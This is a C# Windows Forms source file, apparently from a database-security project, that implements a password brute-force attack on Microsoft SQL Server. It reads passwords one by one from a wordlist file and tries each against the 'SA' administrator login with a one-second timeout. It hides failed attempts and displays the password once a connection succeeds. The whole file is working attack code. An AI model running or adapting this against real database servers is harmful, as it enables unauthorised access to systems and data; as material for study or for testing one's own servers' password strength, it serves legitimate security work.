using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Data.SqlClient;

namespace DBSecurity
{
    public partial class frmBruteForce : Form
    {
        public frmBruteForce()
        {
            InitializeComponent();
        }

        private void frmBruteForce_Load(object sender, EventArgs e)
        {
       
        }

        private void button1_Click(object sender, EventArgs e)
        {
           
           
            string cs;
            string serverName = txtServerName.Text;
            string userName = "SA";
            string dbName = txtDbName.Text;
            string passWord;
            int i;
            int count;
            int k = 0;
            DateTime dt = DateTime.Now;
            int second;
            int minute;
            int hour;

            int duration;

            


            count = Convert.ToInt32(txtCount.Text);

            System.IO.StreamReader sr = new System.IO.StreamReader("uniqpass_preview.txt");

            lstPasswordList.Items.Clear();
            for (i=0;i<count;i++)
            {
                k++;
                passWord = sr.ReadLine();
                lblStatus.Text = passWord;
                lstPasswordList.Items.Add(passWord);
                Update();
                if (k>=15)
                {
                    k = 0;
                    lstPasswordList.Items.Clear();
                    this.Update();
                    lstPasswordList.Update();
                }

                cs = "DATA SOURCE=" + serverName + ";INITIAL CATALOG=" + dbName + ";UID=" + userName + ";PASSWORD=" + passWord + ";CONNECT TIMEOUT=1";
                try
                {

              
                    SqlConnection conn = new SqlConnection(cs);
                    conn.Open();
                if (conn.State==ConnectionState.Open)
                {
                     
                        DateTime dt2 = DateTime.Now;
                        TimeSpan t = dt2 - dt;
                        lblStatus.Text = "Connected! The password is " + passWord + " Password Count:"+i.ToString()+" Duration:" + t.ToString(@"hh\:mm\:ss");
                        return;
                }
                }
                catch (Exception)
                {

 
                }


            }
        }

        private void txtServerName_TextChanged(object sender, EventArgs e)
        {

        }
    }
    }
 
